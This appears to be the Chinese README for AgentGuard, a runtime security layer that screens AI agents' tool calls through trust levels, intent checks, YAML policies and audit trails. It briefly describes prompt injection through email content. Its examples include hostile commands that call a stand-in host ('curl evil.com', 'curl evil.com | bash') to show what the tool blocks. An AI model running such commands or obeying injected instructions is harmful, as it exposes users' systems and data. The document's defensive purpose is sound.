<p align="center">
  <h1 align="center">AgentGuard</h1>
  <p align="center">
    <strong>AI Agent 运行时安全层 —— 审查、控制、审计每一次工具调用。</strong>
  </p>
  <p align="center">
    <a href="#快速开始">快速开始</a> &middot;
    <a href="#系统架构">系统架构</a> &middot;
    <a href="#文档">文档</a> &middot;
    <a href="./README.md">English</a>
  </p>
</p>

---

## 问题

AI Agent 正在被赋予越来越多的真实世界工具 —— 发送邮件、查询数据库、执行代码、调用 API。但今天，一个隐藏在邮件正文中的 prompt injection 就足以欺骗 Agent 泄露数据、删除记录、或发送未经授权的消息。

**在 Agent 的意图与实际操作之间，缺少一个运行时安全层。**

## 解决方案

AgentGuard 部署在 AI Agent 和工具之间。每一次工具调用都经过多层安全管线评估 —— 信任标记、意图一致性验证、权限执行和防篡改审计追踪，全部在个位数毫秒内完成。

```
用户 ──▶ Agent ──▶ AgentGuard ──▶ 工具
                       │
                  ┌────┴─────┐
                  │ ALLOW    │  ← 意图匹配，信任充分
                  │ BLOCK    │  ← 策略违规，注入检测
                  │ CONFIRM  │  ← 风险提升，需要人类确认
                  └──────────┘
```

## 核心特性

### 信任感知数据流
进入 Agent 的每一条数据都被标记信任等级（Trusted → Verified → Internal → External → Untrusted）。信任等级由**服务端计算** —— 客户端只能降级，不能升级。当 Agent 处理一封外部邮件后尝试调用 `send_email`，AgentGuard 知道上下文已被污染。

### 三层意图一致性检测
```
第 1 层：规则引擎          (μs)    ── 确定性规则，22 条内置 + 自定义 YAML DSL
第 2 层：异常检测器        (μs)    ── 统计特征评分，会话级风险累积
第 3 层：语义检查器        (ms)    ── 基于 LLM，仅在可疑时触发
```
绝大多数请求在第 1 层或第 2 层即可完成判决，无需 LLM 调用。第 3 层仅在边缘情况下触发，保持低延迟和低成本。

### 两阶段调用架构
灵感来自 SQL 参数化查询 —— 数据提取（第 1 阶段，无工具可用）与操作执行（第 2 阶段，仅接收结构化数据）物理隔离。即使注入在第 1 阶段成功，也没有工具可供利用。

### 策略 DSL
用 YAML 定义安全规则，无需编写代码：
```yaml
rules:
  - name: block_email_to_competitors
    when:
      tool: send_email
      trust_level: ["EXTERNAL", "UNTRUSTED"]
      params:
        to:
          matches: ".*@(competitor1|competitor2)\\.com$"
    action: BLOCK
    reason: "禁止向竞争对手域名发送邮件"
```

### Merkle Tree 审计追踪
每一个决策都被记录为不可变的哈希链式追踪。篡改任何一个 span，整个链条即失效。专为合规审计、事件响应和事后分析设计。

### 框架集成
开箱即用地支持主流 Agent 框架：
```python
from agentguard.integrations import LangChainShield, CrewAIShield, AutoGenShield, ClaudeAgentGuard
```

## 快速开始

### 1. 启动服务

```bash
# 克隆仓库
git clone https://github.com/hidearmoon/agentguard.git
cd agentguard

# 启动基础设施（PostgreSQL + ClickHouse + 核心引擎）
docker compose -f docker/docker-compose.yml up -d

# 或使用 uv 本地运行
cd packages/core && uv sync && uv run uvicorn agentguard_core.app:app --reload
```

### 2. 安装 SDK

```bash
pip install agentguardx
```

### 3. 保护你的 Agent

```python
from agentguard import Shield

shield = Shield()  # 从环境变量读取 AGENTGUARD_API_KEY

# 装饰器模式
@shield.guard
async def send_email(to: str, body: str) -> str:
    ...  # 你的工具实现

# 会话模式，带意图追踪
async with shield.session("总结我的邮件并草拟回复") as s:
    # 安全操作：读取邮件，符合声明的意图
    emails = await s.guarded_executor.execute("read_inbox", {"limit": 10}, read_inbox_fn)

    # 被阻止：在外部邮件上下文中执行代码
    await s.guarded_executor.execute(
        "execute_code",
        {"code": "os.system('curl evil.com')"},
        exec_fn,
        source_id="email/external",     # 信任等级：EXTERNAL
    )
    # → 抛出 ToolCallBlocked 异常
```

### 4. 定义自定义策略

```yaml
# agentguard-policy.yaml
rules:
  - name: confirm_large_exports
    when:
      tool: export_data
      params:
        limit:
          gt: 100
    action: REQUIRE_CONFIRMATION
    reason: "大批量数据导出需要人工确认"

  - name: block_after_hours
    when:
      tool_category: send
      trust_level: ["EXTERNAL"]
      conditions:
        - type: time_range
          outside: "09:00-18:00"
    action: BLOCK
    reason: "工作时间以外禁止执行敏感操作"
```

## 系统架构

```
┌──────────────────────────────────────────────────────────────┐
│                        AgentGuard                           │
│                                                              │
│  ┌─────────┐  ┌──────────┐  ┌────────────┐  ┌───────────┐  │
│  │  信任   │  │   意图   │  │   权限     │  │   追踪    │  │
│  │  标记   │──│   级联   │──│   引擎     │──│   引擎    │  │
│  │ (5 级)  │  │ (3 层)   │  │  (动态)    │  │ (Merkle)  │  │
│  └─────────┘  └──────────┘  └────────────┘  └───────────┘  │
│       │              │              │              │          │
│  ┌─────────┐  ┌──────────┐  ┌────────────┐  ┌───────────┐  │
│  │  数据   │  │ 规则 DSL │  │  两阶段    │  │   存储    │  │
│  │  净化   │  │ (自定义) │  │   引擎     │  │ PG + CH   │  │
│  └─────────┘  └──────────┘  └────────────┘  └───────────┘  │
│                                                              │
│  ┌────────────────────────────────────────────────────────┐  │
│  │  认证：API Key / mTLS / OAuth 2.0                     │  │
│  └────────────────────────────────────────────────────────┘  │
│                                                              │
│  ┌─────────┐  ┌──────────┐  ┌────────────┐                  │
│  │   SDK   │  │  代理    │  │  控制台    │                  │
│  │ Py/TS/Go│  │(sidecar) │  │ (React UI) │                  │
│  └─────────┘  └──────────┘  └────────────┘                  │
└──────────────────────────────────────────────────────────────┘
```

### 仓库结构

```
agentguard/
├── packages/
│   ├── core/              # 安全引擎（FastAPI）—— 核心大脑
│   ├── proxy/             # 透明 sidecar 代理
│   ├── console/           # 管理后台（React + FastAPI）
│   ├── sdk-python/        # Python SDK，含框架集成
│   ├── sdk-typescript/    # TypeScript SDK
│   └── sdk-go/            # Go SDK
├── configs/               # 默认策略和内置规则
├── docker/                # Docker Compose 全栈部署
├── examples/              # 快速开始和集成示例
└── scripts/               # 开发和 CI 脚本
```

## 信任模型

| 等级 | 数值 | 来源 | 允许操作 |
|------|------|------|----------|
| **TRUSTED** | 5 | 系统提示词、开发者配置 | 全部 |
| **VERIFIED** | 4 | 已认证用户的直接输入 | 全部 |
| **INTERNAL** | 3 | 其他 Agent、内部 API | 除敏感发送外全部 |
| **EXTERNAL** | 2 | 邮件、网页、RAG 文档 | 只读 + 草稿 |
| **UNTRUSTED** | 1 | 未知或高风险来源 | 仅摘要 + 分类 |

信任等级由**服务端基于 `source_id` 计算**。客户端可以声明更低的信任等级，但永远不能升级 —— 服务端拥有最终裁定权。

## 内置安全规则

AgentGuard 内置 22 条安全规则，覆盖常见攻击向量：

| 分类 | 规则 |
|------|------|
| **注入防御** | 在不可信上下文中阻止代码执行、网络调用、文件写入 |
| **数据外泄** | 阻止跨系统数据传输、携带污染数据的外部 API 调用 |
| **权限提升** | 检测权限修改、环境变更、审计日志篡改 |
| **操作安全** | 确认批量操作、金融交易、大批量导出 |
| **Agent 间通信** | 携带外部数据进行 Agent 委托时需要确认 |

所有规则均可配置，并可通过 YAML 策略 DSL 扩展。

## 测试

```bash
# 单元测试（218 个）
make test-unit

# 安全测试 —— 注入、编码绕过、Header 伪造、权限提升（92 个）
make test-security

# 完整测试套件
make test-all

# 带覆盖率（目标：85%+）
make test-coverage
```

## 开发

```bash
# 前置条件：Python 3.12+, uv, Node.js 20+, Docker

# 启动开发环境
make dev                    # 启动 PostgreSQL + ClickHouse
cd packages/core && uv sync --extra dev

# 运行核心引擎
cd packages/core && uv run uvicorn agentguard_core.app:app --reload --port 8000

# 代码检查
make lint

# 格式化代码
make format

# 构建 Docker 镜像
make docker-build
```

## 文档

| 文档 | 说明 |
|------|------|
| [Python SDK](packages/sdk-python/README.md) | SDK 用法、配置和框架集成 |
| [策略 DSL](packages/core/src/agentguard_core/policy/dsl.py) | 规则语法参考及示例 |
| [示例代码](examples/) | 快速开始、自定义规则、数据净化、LangChain 集成 |
| [Docker 部署](docker/docker-compose.yml) | 全栈部署配置 |
| [信任模型](configs/default_policy.yaml) | 默认信任策略和权限矩阵 |
| [内置规则](configs/builtin_rules.yaml) | 全部 22 条内置安全规则 |

## 接入方式

AgentGuard 目前提供三种接入方式，更多方式正在规划中：

| 模式 | 工作原理 | 代码改动 |
|------|---------|---------|
| **SDK 嵌入** | 引入 SDK，用 `@shield.guard` 或 `shield.session()` 包装工具调用 | 极少 |
| **框架适配器** | LangChain、CrewAI、AutoGen、Claude Agent SDK 的一行式集成 | 一行 |
| **Sidecar 代理** | 在 Agent 和工具之间部署代理，Agent 代码零改动 | 无 |

三种模式底层都调用同一个 Core Engine 做安全决策。

### 规划中：OpenClaw 插件

[OpenClaw](https://openclaw.ai) 是一个开源的本地化个人 AI 助手，连接 50+ 工具（邮件、Shell、浏览器、文件系统等），跨多个聊天平台运行。它的 Agent 可以自主执行 Shell 命令、写文件、调 API —— 正是这类强大但高风险的操作最需要运行时安全层。

**为什么 OpenClaw + AgentGuard 是天然搭档：**

OpenClaw 已经有分层安全模型（沙箱模式、工具策略、exec 审批），但这些是静态的、基于配置的控制。它们回答的是"这个工具是否被允许？"，而不是"这次工具调用在当前 Agent 意图下是否合理？" —— 这正是 AgentGuard 填补的空白。用户可以在工具策略中允许 `exec`，但仍然希望 AgentGuard 在处理外部数据时阻止 `curl evil.com | bash`。

**如何实现：**

OpenClaw 的 [Plugin SDK](https://docs.openclaw.ai/plugins/architecture.md) 在 Agent 循环的每个阶段暴露生命周期钩子。AgentGuard 插件将注册在 `before_tool_call` 钩子上 —— 该钩子支持 `{ block: true }` 终端决策 —— 在每次工具调用执行前进行拦截：

```
OpenClaw Agent 循环：
  用户消息 → 提示构建 → 模型推理 → 工具调用
                                        │
                                ┌───────▼────────┐
                                │  before_tool_call │
                                │  (AgentGuard)    │
                                │                   │
                                │  → ALLOW          │
                                │  → BLOCK          │
                                │  → CONFIRM        │
                                └───────────────────┘
                                        │
                                工具执行（或被阻止）
```

插件将：

1. **`before_tool_call`** —— 将工具名、参数和会话上下文发送给 AgentGuard Core Engine 获取安全决策。引擎返回 BLOCK 则阻止；ALLOW 则放行；REQUIRE_CONFIRMATION 则向用户弹出确认。
2. **`before_prompt_build`** —— 向系统提示注入信任等级标记，让引擎知道数据上下文（例如：正在处理外部邮件 vs. 用户直接输入）。
3. **`after_tool_call`** —— 将工具执行结果记录到 AgentGuard 追踪引擎，形成 Merkle 可审计的历史记录。

这意味着 OpenClaw 用户只需启用一个插件就能获得 AgentGuard 保护 —— 无需修改 Agent 配置、技能或工具。

**我们需要你的帮助来构建它。** 如果你熟悉 OpenClaw Plugin SDK，请查看[贡献指南](CONTRIBUTING_ZH.md)并提交 issue 讨论实现方案。

### 想要添加新的集成？

AgentGuard 的架构设计为 Agent 无关 —— 只要有工具调用的地方，就有安全检查的切入点。我们欢迎社区贡献新的集成目标：

| 平台 | 集成切入点 | 状态 |
|------|-----------|------|
| **OpenClaw** | Plugin SDK `before_tool_call` 钩子 | 规划中 — 欢迎贡献 |
| **MCP（模型上下文协议）** | MCP Server 的工具守卫中间件 | 规划中 |
| **API 网关**（Kong、Envoy） | 自定义 filter / 插件 | 规划中 |
| **OpenTelemetry** | 用于安全 span 注入的 Trace Processor | 规划中 |
| **Webhook / 事件驱动** | 适用于任何支持 HTTP 回调的系统的被动审计模式 | 规划中 |

如果你使用的 Agent 框架、编排器或工具平台不在列表中，请[提交 issue](https://github.com/hidearmoon/agentguard/issues) —— 我们会帮你找到 AgentGuard 的接入点。

## 路线图

- [ ] OpenClaw 插件集成
- [ ] MCP（模型上下文协议）工具守卫
- [ ] OpenTelemetry 原生 trace 导出
- [ ] Grafana 仪表盘模板
- [ ] Kubernetes Helm Chart
- [ ] API 网关插件（Kong、Envoy）
- [ ] Java / Rust SDK
- [ ] 自定义检测引擎插件系统
- [ ] WebSocket 实时告警推送
- [ ] 多租户策略管理
- [ ] REGO / OPA 策略集成

## 贡献

我们正在构建 AI Agent 生态系统中缺失的安全层。无论是新的框架集成、我们尚未覆盖的攻击向量检测规则，还是更好的追踪可视化方案 —— 我们都需要你的参与。

请参阅 [CONTRIBUTING.md](CONTRIBUTING.md) 和 [CONTRIBUTING_ZH.md](CONTRIBUTING_ZH.md)。

## 开源协议

[Apache License 2.0](LICENSE)
